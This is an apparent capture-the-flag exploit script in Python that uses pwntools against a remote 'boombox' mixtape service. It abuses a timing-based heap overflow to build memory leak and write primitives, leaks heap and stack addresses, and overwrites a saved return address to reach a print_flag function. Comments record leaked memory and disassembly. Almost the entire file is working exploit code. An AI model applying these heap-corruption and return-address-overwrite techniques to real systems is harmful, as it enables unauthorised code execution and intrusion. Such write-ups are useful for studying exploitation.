#!/usr/bin/env python
from pwn import *
import IPython

notes = [
    "beep", "bop", "zip", "zam",
    "flim", "flam", "ity", "bad",
    "do", "dub", "da", "bez",
    "um", "yo", "wop", "bap"
    ]

encode_notes = lambda s: ''.join(notes[(ord(c)&0xf0) >> 4] + notes[ord(c)&0x0f] for c in s)

def fixup_hex(s):
    print(repr(s))
    s = re.sub('[^0-9A-F]', '', s)
    print(repr(s))
    if len(s) % 2 == 1:
        s = s[:-1]
    print(repr(s))
    return s

def decode_notes(s):
    for (i, note) in enumerate(notes):
        s = s.replace(note, chr(0x30+i if i < 10 else 0x41+(i-10)))
    s = fixup_hex(s).decode('hex')
    print(repr(s))
    return s

'''
 +----------------------+
 | 1. upload mixtape    |
 | 2. eject mixtape     |
 | 3. select mixtape    |
 | 4. play              |
 | 5. fast forward      |
 | 6. rewind            |
 | 7. next track        |
 | 8. previous track    |
 | 9. record            |
 | 10. seek             |
 | 11. print menu       |
 | 12. exit             |
 +----------------------+
'''

def upload(p, name, tracks):
    p.sendline('1')
    p.recvuntil(['Mixtape name:'])
    p.sendline(name)
    p.recvuntil(['Number of tracks:'])
    p.sendline(str(len(tracks)))
    for trackname, data in tracks:
        p.recvuntil(['Track name:'])
        p.sendline(trackname)
        p.recvuntil(['Upload track data now...'])
        p.sendline(data)
    print(p.recvuntil(['PRESS ENTER TO RETURN TO MENU']))
    p.sendline('')

def eject(p, i):
    p.sendline('2')
    p.recvuntil(['What mixtape do you want to eject?'])
    p.sendline(str(i))
    print(p.recvuntil(['Mixtape ejected!', 'No mixtape to eject from this slot!']))
    p.recvuntil(['PRESS ENTER TO RETURN TO MENU'])
    p.sendline('')

def select(p, i):
    p.sendline('3')
    p.recvuntil(['Which mixtape do you want to switch to?'])
    p.sendline(str(i))
    print(p.recvuntil(['Switched to new mixtape slot!']))
    p.recvuntil(['PRESS ENTER TO RETURN TO MENU'])
    p.sendline('')

def rewind(p, i):
    p.sendline('6')
    #print(p.recvuntil(['Press enter to stop the rewind...']))
    print('waiting for %f seconds' % (i,))
    time.sleep(i)
    print('finished waiting')
    p.sendline('')
    print(p.recvuntil(['PRESS ENTER TO RETURN TO MENU']))
    p.sendline('')

def fast_forward(p, i):
    p.sendline('5')
    #p.recvuntil(['Press enter to stop fast forwarding...'])
    print('waiting for %f seconds' % (i,))
    time.sleep(i)
    print('finished waiting')
    p.sendline('')
    print(p.recvuntil(['PRESS ENTER TO RETURN TO MENU']))
    p.sendline('')

def prev_track(p):
    p.sendline('8')
    print(p.recvuntil(['PRESS ENTER TO RETURN TO MENU']))
    p.sendline('')

def next_track(p):
    p.sendline('7')
    print(p.recvuntil(['PRESS ENTER TO RETURN TO MENU']))
    p.sendline('')

def seek(p, i):
    p.sendline('10')
    p.recvuntil(['How far would you like to seek into the track?'])
    p.sendline(str(i))
    print(p.recvuntil(['PRESS ENTER TO RETURN TO MENU']))
    p.sendline('')

def play(p, playtime=0.1):
    p.sendline('4')
    r = r'  \|   \|  ([a-z]*)\.\.\.  \|   \|'
    #s = p.recvregex(r)
    s = p.recvuntil(['Press enter to stop listening to music...', 'End of track! Nothing to play'])
    t = re.findall(r, s)
    time.sleep(playtime)
    p.sendline('')
    print(p.recvuntil(['PRESS ENTER TO RETURN TO MENU']))
    p.sendline('')
    return decode_notes(t[0]) if t else t

def record(p, data):
    p.sendline('9')
    p.recvuntil(['Starting recording...'])
    p.sendline(encode_notes(data))
    print(p.recvuntil(['PRESS ENTER TO RETURN TO MENU']))
    p.sendline('')

p = remote('40.118.168.81', 4444)
p.recvuntil('MENU SELECTION:')
upload(p, "tape1", [('track1', cyclic(0x200)), ('track2', cyclic(0x200))])
upload(p, "tape2", [('track3', '0123456789')])
p.recvuntil('MENU SELECTION:')

def attempt1():
    next_track(p)
    #IPython.embed()
    print(play(p))
    seek(p, 506)
    s = play(p)
    print(s, cyclic(0x200).find(s))
    #fast_forward(p, 10)
    seek(p, 0)
    record(p, 'Z'*0x200)
    #seek(p, 506)
    #record(p, '\x88'*0x1f0)
    #record(p, '\x88'*0x1f0)
    #s = play(p)
    #print(s)
    #play(p, 1.1)

def attempt2():
    # ToC/ToU heap smash
    next_track(p)
    seek(p, 0x200-6)
    fast_forward(p, 1.8)
    # smash past the end of tape[0]->track[1]->data to overwrite tape[2]->name
    record(p, cyclic(0x200))
    '''
    | MENU SELECTION: $ 3
    | Uploaded Mixtapes
    |    1. tape1
    |    2. eaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaad
    |    3. EMPTY
    |    4. EMPTY
    |    5. EMPTY
    |    6. EMPTY
    |    7. EMPTY
    |    8. EMPTY
    |    9. EMPTY
    |   10. EMPTY
    | Which mixtape do you want to switch to? $ 
    '''
    '''
    >>> from pwn import *
    >>> cyclic(0x200).find('eaaafaaag')
    16
    '''
    # there are 16 bytes between where the overwrite starts and the start of name
    # 8 of which are a pointer to a struct boombox_t on the stack (leak this to get retaddr offset)
    # the 8 before it are probably heap metadata
    pass

def consecutive_leak(p, off, n):
    i = off
    buf = ''
    while len(buf) < n:
        print('%d of %d' % (len(buf), n))
        seek(p, i)
        tmp = play(p)
        if len(tmp) == 0:
            break
        i += len(tmp)
        buf += tmp
    return buf

def write_prim(p, off, s):
    seek(p, off)
    record(p, s)

def attempt3():
    seek(p, 0x200-6)
    fast_forward(p, 1.8)
    # heap padding(8 bytes), track name(0x20 bytes), length(8 bytes)
    record(p, "A"*(8 + 0x20) + p32(1024))
    next_track(p)
    #s = consecutive_leak(p, 0x1f0, 0x40)
    # 'yaaezaafbaafcaa\x00\xbd\x1c\\|\xf0\x0b\x00\x10p\xfbW\xf3\xb0\x00\x00\x00tape2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
    '''
    >>> s = 'yaaezaafbaafcaa\x00\xbd\x1c\\|\xf0\x0b\x00\x10p\xfbW\xf3\xb0\x00\x00\x00tape2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00'
    >>> map(hex,struct.unpack('<QQQQQ', s[:8*5]))
    ['0x6661617a65616179', '0x61616366616162', '0x10000bf07c5c1cbd', '0xb0f357fb70', '0x3265706174']
    >>> struct.pack('<Q', 0x3265706174)
    'tape2\x00\x00\x00'
    '''
    #s = consecutive_leak(p, 0x1f0, 0x90)
    # 'yaaezaafbaafcaa\x00\x8c\xd4\xb9j\xfc\x17\x00\x10\x90\xfd*>\xc0\x00\x00\x00tape2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xa0\xb6D>\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    #s = consecutive_leak(p, 0x1f0, 0x200)
    # 'yaaezaafbaafcaa\x00\x92\x0b\x984\x07\xa7\x00\x10\x00\xf96\xdc\x14\x00\x00\x00tape2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\xa0\xb6B\xdc\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xbb\x0b\x98\x1d.\xa7\x00\x08track3\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\n\x00\x00\x00\x00\x00\x00\x000123456789\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    '''
    >>> import struct
    >>> x = len(s)/8
    >>> struct.unpack('<'+'Q'*x, s[:8*x])
    (7377284842924368249, 27410152288248162, 1153105153995836306, 89593936128, 216450228596, 0, 0, 0, 1, 89594705568, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 576644568810261435, 56536321847924, 0, 0, 0, 10, 3978425819141910832, 14648, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
    >>> map(hex, struct.unpack('<'+'Q'*x, s[:8*x]))
    ['0x6661617a65616179', '0x61616366616162', '0x1000a70734980b92', '0x14dc36f900', '0x3265706174', '0x0', '0x0', '0x0', '0x1', '0x14dc42b6a0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x800a72e1d980bbb', '0x336b63617274', '0x0', '0x0', '0x0', '0xa', '0x3736353433323130', '0x3938', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0']
    '''
    s = consecutive_leak(p, 0x1f0, 8*5)
    print(repr(s))
    x = struct.unpack('<QQQQQ', s[:8*5])
    print(map(hex,x))
    boombox = x[3]
    print(hex(boombox))
    # tape[1]->track[0] = &boombox - 0x10
    # so that track->length (offset 0x20) lines up with boombox->tapes (0x10), which is a pointer (and hence obscenely large)
    # (render_music does something quadratic with the length, so a pointer-as-length won't allow leaking the stack in reasonable time)
    # offset by 0x8 to line it up with tapes[1], so that data aliasing unused tapes, to create a fake track structure to leak the stack with
    write_prim(p, 0x1f0 + 9*8, p64(boombox-0x10))
    select(p,2)
    # fake length field at tapes[10] (can't create it in 2 since that would need to be a valid pointer to swap tapes)
    #write_prim(p, 0x8*6, p64(boombox+0x10)) # this writes to slot 8
    write_prim(p, 0x8*9, p64(0x300))
    select(p,1)
    next_track(p)
    write_prim(p, 0x1f0 + 9*8, p64(boombox-0x10+(8*10))) # use the fake length field at tapes[10]
    select(p,2)
    #t = consecutive_leak(p, 0, 0x100)
    #t = consecutive_leak(p, 0, 0x200)
    #t = consecutive_leak(p, 0, 0xa0)
    #i = len(t)/8
    #y = struct.unpack('<'+'Q'*i, t[:8*i])
    #print(repr(t))
    #print(repr(y))
    # '\x00\xd0\x13"\xf7\x7f\x00\x00Dp\x1f"\xf7\x7f\x00\x004\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfc\x7f\x00\x00\xcb\x8d\xbaF s\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xef@\x1f"\xf7\x7f\x00\x00\x9cA\x1f"\xf7\x7f\x00\x00\x00\xd0\x13"\xf7\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9cA\x1f"\xf7\x7f\x00\x00\x00\xd0\x13"\xf7\x7f\x00\x00\xd2\x13\nk\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9cA\x1f"\xf7\x7f\x00\x00DT\x01m\xfc\x7f\x00\x00\xb0\x13\nk\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    # '\x00\x90\x82!\xf7\x7f\x00\x00Dp\x1f"\xf7\x7f\x00\x004\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xfc\x7f\x00\x00\x16\x8d\xe4\xe7e\x0b\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xef@\x1f"\xf7\x7f\x00\x00\x9cA\x1f"\xf7\x7f\x00\x00\x00\x90\x82!\xf7\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9cA\x1f"\xf7\x7f\x00\x00\x00\x90\x82!\xf7\x7f\x00\x00\xd2\x13\nk\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x9cA\x1f"\xf7\x7f\x00\x00DT\x01m\xfc\x7f\x00\x00\xb0\x13\nk\xfc\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    '''
    >>> import struct
    >>> x = len(s)/8
    >>> struct.unpack('<'+'Q'*x, s[:8*x])
    (140699405373440, 140699406135364, 2612, 0, 140720308486144, 126582462778827, 0, 0, 0, 0, 140699406123247, 140699406123420, 140699405373440, 0, 140699406123420, 140699405373440, 140722104308690, 0, 0, 0, 0, 140699406123420, 140722137289796, 140722104308656, 0, 0, 0, 0, 0, 0, 0, 0)
    >>> map(hex, struct.unpack('<'+'Q'*x, s[:8*x]))
    ['0x7ff72213d000', '0x7ff7221f7044', '0xa34', '0x0', '0x7ffc00000000', '0x732046ba8dcb', '0x0', '0x0', '0x0', '0x0', '0x7ff7221f40ef', '0x7ff7221f419c', '0x7ff72213d000', '0x0', '0x7ff7221f419c', '0x7ff72213d000', '0x7ffc6b0a13d2', '0x0', '0x0', '0x0', '0x0', '0x7ff7221f419c', '0x7ffc6d015444', '0x7ffc6b0a13b0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0', '0x0']
    '''
    # boombox is at rbp-0x59
    # main's rsp is at (rbp+0x47)-0xc0
    # main's caller's rsp is at main's rsp+0xc0
    # main's caller's rsp is at boombox+0x59+0x47
    '''
    0x1400038d0    48895c2408     movq %rbx, 8(%rsp)
    0x1400038d5    4889742410     movq %rsi, 0x10(%rsp)
    0x1400038da    48897c2418     movq %rdi, 0x18(%rsp)
    0x1400038df    55             pushq %rbp
    0x1400038e0    4156           pushq %r14
    0x1400038e2    4157           pushq %r15
    0x1400038e4    488d6c24b9     leaq -0x47(%rsp), %rbp
    0x1400038e9    4881ecc00000.  subq $0xc0, %rsp
    0x1400038f0    488b05093700.  movq 0x3709(%rip), %rax      ; [0x140007000:8]=0x2b992ddfa232  LEA section..data ; "2..-.+" @ 0x140007000
    0x1400038f7    4833c4         xorq %rsp, %rax
    0x1400038fa    48894537       movq %rax, 0x37(%rbp)
    0x1400038fe    33d2           xorl %edx, %edx
    0x140003900    488d4dab       leaq -0x55(%rbp), %rcx
    0x140003904    c745a7000000.  movl $0, -0x59(%rbp)
    0x14000390b    448d425c       leal 0x5c(%rdx), %r8d        ; 0x5c  ; '\'
    -----
    0x140003c53    33c0           xorl %eax, %eax
    0x140003c55    488b4d37       movq 0x37(%rbp), %rcx        ; [0x37:8]=0xf80000000000  ; '7'
    0x140003c59    4833cc         xorq %rsp, %rcx
    0x140003c5c    e8bf010000     callq sub.initialize_global_cookie
    0x140003c61    4c8d9c24c000.  leaq 0xc0(%rsp), %r11        ; 0xc0 
    0x140003c69    498b5b20       movq 0x20(%r11), %rbx        ; [0x20:8]=0
    0x140003c6d    498b7328       movq 0x28(%r11), %rsi        ; [0x28:8]=0 ; '('
    0x140003c71    498b7b30       movq 0x30(%r11), %rdi        ; [0x30:8]=0 ; '0'
    0x140003c75    498be3         movq %r11, %rsp
    0x140003c78    415f           popq %r15
    0x140003c7a    415e           popq %r14
    0x140003c7c    5d             popq %rbp
    0x140003c7d    c3             retq
    '''
    retaddr_idx = 10
    #old_retaddr = y[retaddr_idx]
    (old_retaddr,) = struct.unpack('<Q', consecutive_leak(p, 8*retaddr_idx, 8)[:8])
    #goal_addr = 0x140003820 # print_flag
    #goal_addr = 0x140003320 # print_boombox
    #goal_addr = 0x140003280 # print_with_notes
    #goal_addr = 0x140002bf0 # print_menu
    goal_addr = 0x14000383b # offset into print_flag to skip stack fiddling
    retaddr = old_retaddr - 0x1400040ef + goal_addr
    print(hex(retaddr))
    write_prim(p, 8*retaddr_idx, p64(retaddr)+"A"*(8*2))

attempt3()

#p.interactive()
p.sendline('exit')
print(p.recvregex('flag{[^}]*}'))
